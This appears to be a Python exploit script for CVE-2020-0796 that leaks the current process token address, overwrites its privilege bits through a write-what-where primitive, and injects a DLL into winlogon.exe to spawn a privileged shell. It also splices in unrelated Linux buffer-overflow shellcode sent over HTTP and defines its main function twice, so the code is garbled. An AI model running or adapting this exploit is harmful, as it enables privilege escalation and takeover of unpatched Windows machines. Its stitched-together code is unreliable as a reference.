# Windows Kernel Write-What-Where CVE-2020-0796 Exploit
# Intended only for educational and testing in corporate environments.
# MasterSpl0it takes no responsibility for the code, use at your own risk.
# Mast3rSpl0it@gmail.com
# Rewritten CVE-2020-0796 Local Privilege Escalation POC.
# Based on the work of Alexandre Beaulieu:
# https://gist.github.com/alxbl/2fb9a0583c5b88db2b4d1a7f2ca5cdda

import sys
import random
import binascii
import struct
import os
import subprocess
import pathlib
import requests
from requests.auth import HTTPDigestAuth
import httplib
from write_what_where import write_what_where

from ctypes import *
from ctypes.wintypes import *


kernel32 = windll.kernel32
buffer_addr = "\x98\xF1\xFF\xBF" # 0xbffff198
host = " "
port = 8000
ntdll = windll.ntdll
psapi = windll.psapi
advapi32 = windll.advapi32
OpenProcessToken = advapi32.OpenProcessToken

STATUS_SUCCESS = 0
STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
STATUS_INVALID_HANDLE = 0xC0000008
TOKEN_QUERY = 8
SystemExtendedHandleInformation = 64

NTSTATUS = DWORD
PHANDLE = POINTER(HANDLE)
PVOID = LPVOID = ULONG_PTR = c_void_p


ntdll.NtQuerySystemInformation.argtypes = [DWORD, PVOID, ULONG, POINTER(ULONG)]
ntdll.NtQuerySystemInformation.restype = NTSTATUS

advapi32.OpenProcessToken.argtypes = [HANDLE, DWORD , POINTER(HANDLE)]
advapi32.OpenProcessToken.restype  = BOOL

buffer_addr = "\x98\xF1\xFF\xBF" # 0xbffff198
payload = """
\xEB\x19\x31\xC0\x31\xDB\x31\xD2\x31\xC9\xB0\x04\xB3
\x01\x59\xB2\x07\xCD\x80\x31\xC0\xB0\x01\x31\xDB\xCD
\x80\xE8\xE2\xFF\xFF\xFF\x68\x61\x63\x6B\x65\x64\x21
""".strip()
padding = 1


class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
    _fields_ = [
        ("Object", PVOID),
        ("UniqueProcessId", PVOID),
        ("HandleValue", PVOID),
        ("GrantedAccess", ULONG),
        ("CreatorBackTraceIndex", USHORT),
        ("ObjectTypeIndex", USHORT),
        ("HandleAttributes", ULONG),
        ("Reserved", ULONG),
    ]
class SYSTEM_HANDLE_INFORMATION_EX(Structure):
    _fields_ = [
        ("NumberOfHandles", PVOID),
        ("Reserved", PVOID),
        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
    ]



def overflow():
  nops = "\x90" * 100
  rets = buffer_addr * 200
  code = nops + payload + ("A" * padding) + rets
  return code

def exploit():
  connection = httplib.HTTPConnection(host, port)
  connection.request("GET", overflow())
  response = connection.getresponse()


def find_handles(pid, data):
    """
    Parses the output of NtQuerySystemInformation to find handles associated
    with the given PID.
    """
    api_token = 'SrvNetAllocateBufferFromPool'
    header = cast(data, POINTER(SYSTEM_HANDLE_INFORMATION_EX))
    nentries = header[0].NumberOfHandles
    print('[+] Leaking access token address')

    handles = []
    data = bytearray(data[16:])

    while nentries > 0:
        p = data[:40]
        e = struct.unpack('<QQQLHHLL', p)
        nentries -= 1
        data = data[40:]
        hpid = e[1]
        handle = e[2]

        if hpid != pid: continue
        handles.append((e[1], e[0], e[2]))

    return handles

def get_token_address():
    """
    Leverage userland APIs to leak the current process' token address in kernel
    land.
    """
    hProc = HANDLE(kernel32.GetCurrentProcess())
    pid = kernel32.GetCurrentProcessId()
    print('[+] Current PID: ' + str(pid))

    h = HANDLE()

    res = OpenProcessToken(hProc, TOKEN_QUERY, byref(h))

    if res == 0:
        print('[-] Error getting token handle: ' + str(kernel32.GetLastError()))
    else:
        print('[+] Token Handle: ' + str(h.value))
    #leaking the current process token address by using the NtQuerySystemInformation(SystemHandleInformation)
    q = STATUS_INFO_LENGTH_MISMATCH
    out = DWORD(0)
    sz = 0
    while q == STATUS_INFO_LENGTH_MISMATCH:
        sz += 0x1000
        handle_info = (c_ubyte * sz)()
        q = ntdll.NtQuerySystemInformation(SystemExtendedHandleInformation, byref(handle_info), sz, byref(out))

   
    handles = find_handles(pid, handle_info)
    hToken = list(filter(lambda x: x[0] == pid and x[2] == h.value, handles))
    if len(hToken) != 1:
        print('[-] Could not find access token address!')
        return None
    else:
        pToken = hToken[0][1]
        print('[+] Found token at ' + hex(pToken))
    return pToken

def exploit():
    """
    Exploits the bug to escalate privileges.

    Reminder:
    0: kd> dt nt!_SEP_TOKEN_PRIVILEGES
       +0x000 Present          : Uint8B
       +0x008 Enabled          : Uint8B
       +0x010 EnabledByDefault : Uint8B
    """
    token = get_token_address()
    if token is None: sys.exit(-1)

    what = b'\xFF' * 8 * 3
    where = token + 0x40

    print('[+] Writing full privileges on address %x' % (where))

    write_what_where('127.0.0.1', what, where)

    print('[+] done! ')
    print('[+] Check your privileges: !token %x' % (token))

    dll_path = pathlib.Path(__file__).parent.absolute().joinpath('spawn_cmd.dll')
    subprocess.call(['Injector.exe', '--process-name', 'winlogon.exe', '--inject', dll_path], stdout=open(os.devnull, 'wb'))

if __name__ == "__main__":
    exploit()
